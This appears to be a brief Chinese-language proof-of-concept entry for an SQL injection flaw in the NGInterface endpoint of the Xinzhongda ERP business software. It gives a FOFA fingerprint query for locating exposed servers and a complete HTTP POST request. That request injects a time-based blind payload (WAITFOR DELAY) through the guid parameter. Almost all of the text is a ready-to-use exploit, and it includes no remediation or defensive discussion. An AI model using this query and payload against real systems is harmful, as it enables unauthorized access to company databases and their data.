# 新中大ERP企业管理软件 NGInterface 存在SQL注入

## fofa
```
body="Resource/pic/product_btn.png" || body="/login/SSOValidation.html"
```

## poc
```javascript
POST /filesrv/NGInterface/Index HTTP/1.1
Host:
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0
Cache-Control: no-cache
Content-Type: application/x-www-form-urlencoded; charset=utf-8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

type=getfilelist&guid=';WAITFOR+DELAY+'0:0:3'--
```
